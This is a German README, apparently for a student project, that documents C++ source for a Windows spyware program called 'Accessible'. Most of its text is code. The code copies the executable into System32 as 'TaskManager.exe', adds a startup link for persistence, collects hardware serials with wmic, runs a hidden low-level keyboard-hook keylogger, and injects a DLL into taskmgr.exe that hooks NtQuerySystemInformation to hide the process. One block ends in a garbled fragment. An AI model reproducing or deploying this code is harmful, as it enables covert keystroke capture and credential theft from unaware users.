# Readme: Accessible Spyware

Autoren: Deniz Kural, Rahul Gupta 3DHIT

Accessible ist eine Spyware, die Keylogs so unentdeckt wie möglich (Ring 3) abspeichert. Der Source Code sollte nicht falsch benutzt werden. 

### Autostart Funktion

**Path**

Hier wird der Path des Programs gelesen, mit hilfe der `GetModuleFileName` Methode.

Ein Beispiel wäre z.b. "C:\Users\Deniz\Documents\Accessible.exe"

```cpp
const unsigned int iMaxPathLength = 256;
char fileName[iMaxPathLength] = { 0 }; //filename (for example in downloads)
//Full path vom Programm bekommen
GetModuleFileName(NULL, fileName, iMaxPathLength);
```

**System32**

Hier wird die Executable nach System32 kopiert, damit sichergestellt wird, das sie immer als Admin ausgeführt wird. Das könnte man durch eine UAC-Umgehung erzielen.

Außerdem ist das Programm unter dem Namen "TaskManager.exe" im System32 Folder weniger suspekt. 

```cpp
//File nach System32 kopieren, und zu TaskManager umbenennen
LPCTSTR lpNewFileName = "C:\\Windows\\System32\\TaskManager.exe";
LPCTSTR copyFileName = (LPCTSTR)fileName;

BOOL bSuccess = CopyFile(copyFileName, lpNewFileName, FALSE);

if (!bSuccess) {
	cout << "Error while copying file to system32";
}
else {
	cout << "Copied file to system32";
}
```

**Create Symbolic Link:**

Hier wird das Programm mittels Symlink (.lnk) in den Startupfolder gegeben.
Bei jedem Systemstart wird das Programm automatisch im Hintergrund ausgeführt.

Pfad: 

C:\Users\Gugugaga\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

oder mittels WIN+R "shell:startup" zu erreichen.

```cpp
LPCTSTR targetPath = "C:\\Windows\\System32\\TaskManager.exe";
LPCTSTR symlinkPath = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Administrative Tools\\Task Manager.lnk";

if (CreateSymbolicLink(symlinkPath, targetPath, 0) == 0) {
	std::cout << "Error creating symbolic link: " << GetLastError() << std::endl;
}
else {
	std::cout << "Symbolic link created successfully" << std::endl;
}
```

### Check Serials

Hier wird mittels system() und Windows API Befehle ausgeführt, die MAC und HWID ausgibt. 

```cpp
#pragma once
#include <Windows.h>

void checkSerials() {
	system("@echo SMBIOS");
	system("@echo off");
	system("wmic csproduct get uuid");
	system("@echo BIOS");
	system("@echo off");
	system("wmic bios get serialnumber");
	system("@echo MOTHERBOARD");
	system("@echo off");
	system("wmic baseboard get serialnumber");
	system("@echo GPU");
	system("@echo off");
	system("wmic PATH Win32_VideoController GET Description, PNPDeviceID");
	system("@echo Chassis");
	system("@echo off");
	system("wmic systemenclosure get serialnumber");
	system("@echo CPU");
	system("@echo off");
	system("wmic cpu get serialnumber");
	system("@echo HDD/SSD");
	system("@echo off");
	system("wmic diskdrive get serialnumber");
	system("@echo VOLUME");
	system("@echo off");
	system("vol");
	system("echo.");
	system("@echo RAM");
	system("@echo off");
	system("wmic memorychip get serialnumber");
	system("@echo WINDOWS PRODUCT ID");
	system("@echo off ");
	system("wmic os get serialnumber");
	system("@echo MAC");
	system("@echo off");
	system("wmic path Win32_NetworkAdapter where \"PNPDeviceID like '%%PCI%%' AND NetConnectionStatus = 2 AND AdapterTypeID = '0'\" get MacAddress");
	system("pause");
}
```

### Keylogger

Hier wird mittels **SetHook()** eine Hook gesetzt, die im Hintergrund ausgeführt wird, um Keystrokes abzuhören.

Durch **invisibleCMD()** wird das Fenster des Prozesses nicht angezeigt, und der User bekommt nichts mit.

```cpp
void startKeyLogger()
{
	// open output file
	const char* output_filename = "keylogger.txt";
	std::cout << "Logging output to " << output_filename << std::endl;
	output_file.open(output_filename, std::ios_base::app);

	// visibility of window
	invisibleCMD();

	// set the hook
	SetHook();

	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
}
```

Die **SetHook()** Methode setzt den Hook mittel WINAPI, SetWindowsHookEx. Im Parameter wird angegeben, welche Schnittstelle gehooked werden soll.

```cpp
void SetHook()
{
    // Set the hook and set it to use the callback function above
    // WH_KEYBOARD_LL means it will set a low level keyboard hook.
    // The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
    // function that sets and releases the hook.
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        cout << "failed";

    }
}
```

Die **HookCallBack()** Methode wird bei jedem entdeckten Keystroke ausgeführt, und speichert den jeweiligen Keystroke mittels **Save()** (vorübergehend) in eine TXT File.

```cpp
// This is the callback function. EVENT WHEN KEY IS PRESSED
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// save to file
			Save(kbdStruct.vkCode);
		}
	}
// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}
```

### Hide Process in Task Manager

Manipulation of ntdl.dll Driver

**DLL:**

Hier wird durch die HANDLE des Taskmanagers, gehookt, wodurch man frei ins Programm schreiben kann.

```cpp
BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	HANDLE pipe = INVALID_HANDLE_VALUE;
	FunctionHooker hooker;
	HMODULE ntdllBase; 
	BOOL isWowProcess;
	BOOL wowCheckFailed = 0;
	void* ntQueryAddr;
	void* rtlInitAddr;
	void* rtlAnsiToUnicodeAddr;


    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

		ntdllBase = LoadLibraryA("ntdll.dll");
		
		ntQueryAddr = GetProcAddress(ntdllBase, "NtQuerySystemInformation");
		rtlInitAddr = GetProcAddress(ntdllBase, "RtlInitAnsiString");
		rtlAnsiToUnicodeAddr = GetProcAddress(ntdllBase, "RtlAnsiStringToUnicodeString");

		pipe = CreateFileW(L"\\\\.\\pipe\\UnmanagerPipe", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);

		if (pipe != INVALID_HANDLE_VALUE)
		{
			DWORD bytesRead;

			char readBuffer[MAX_PATH];

			while (!ReadFile(pipe, readBuffer, MAX_PATH, &bytesRead, NULL))
			{
				Sleep(5);
			}

			_RtlInitAnsiString MyRtlInitAnsiString;
			_RtlAnsiStringToUnicodeString MyRtlAnsiStringToUnicodeString;

			if (rtlInitAddr)
			{
				MyRtlInitAnsiString = (_RtlInitAnsiString) rtlInitAddr;

				if (rtlAnsiToUnicodeAddr)
				{
					MyRtlAnsiStringToUnicodeString = (_RtlAnsiStringToUnicodeString) rtlAnsiToUnicodeAddr;

					ANSI_STRING originalString;

					MyRtlInitAnsiString(&originalString, readBuffer);

					NTSTATUS status = MyRtlAnsiStringToUnicodeString(&hiddenName, &originalString, true);

					if (NT_SUCCESS(status))
					{
						if (ntQueryAddr)
						{
							#if _WIN64
								hooker.HookFunction64(ntQueryAddr, &MyNtQuerySystemInformation, &hookData);
							#elif _WIN32							
								// Currently unsupported. 
							#endif
						}
					}
				}
			}

			CloseHandle(pipe);
		}

		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```



**Injector:**

**OpenProcess**: Liest die ProcID des laufenden Taskmanagers, um die DLL zu injecten.

InjectDLL: Jetzt wird in die Taskmanager.exe mit einer DLL injected, um in den Prozess laufend reinzuschreiben.

Bei der **WriteFile()** Funktion wird der hiddenName übergeben, der nicht angezeigt werden soll (WINAPI). Hier wird in den Prozess geschrieben

Im Hintergrund läuft auch eine Hook, die schaut, wann der Taskmanager ausgeführt wird. Wenn man es schließt und öffnet, wird jedes mal injected.

```cpp
while (1)
	{
		if (shouldPrintSearchMessage)
		{
			shouldPrintSearchMessage = 0;
			con.WriteLine("Searching for taskmgr.exe...");
		}

		Sleep(10);

		pid = manager.GetPidFromProcessName(L"taskmgr.exe");
		
		if (pid != -1)
		{
			shouldPrintSearchMessage = 1;
			con.WriteLine("Found taskmgr.exe...");


			taskMgrHandle = OpenProcess(PROCESS_QUERY_INFORMATION | SYNCHRONIZE, false, pid);

			if (taskMgrHandle)
			{
				con.WriteLine("Got valid process handle for taskmgr.exe...");
				con.WriteLine("Attempting to inject dll into taskmgr.exe...");

				pipe = CreateNamedPipeW(L"\\\\.\\pipe\\UnmanagerPipe", PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, MAX_PATH, MAX_PATH, 0, NULL);

				if (pipe == INVALID_HANDLE_VALUE)
				{
					con.WriteLine("Could not create pipe to communicate with injected dll...");
					con.WriteLine("Exiting program...");
					return 1;
				}

				if (manager.InjectDLL(pid, fullDllPath))
				{
					con.WriteLine("Successfully injected dll...");

					DWORD bytesWritten;

					while (!WriteFile(pipe, hiddenName, MAX_PATH, &bytesWritten, NULL))
					{
						Sleep(10);
					}

					con.WriteLine("Waiting for taskmgr.exe to close...");

					WaitForSingleObject(taskMgrHandle, INFINITE); 

					con.WriteLine("taskmgr.exe closed...");

					DisconnectNamedPipe(pipe);
					CloseHandle(pipe);
				}
				else
				{
					con.WriteLine("Failed to inject dll into taskmgr.exe...are you running the correct architecture version? (e.i x86 on x86 and x64 on x64)");
				}

			}
			else
			{
				con.WriteLine("Failed to open handle to taskmgr.exe...are you running as Administrator?");
			}

			CloseHandle(taskMgrHandle);
		}
	}e(snapshot);
			return true;
		}
	}

	CloseHandle(snapshot);
	return false;
}
```

In diesem Projekt haben wir gelernt, wie man mit der WINAPI in C++ umgeht.
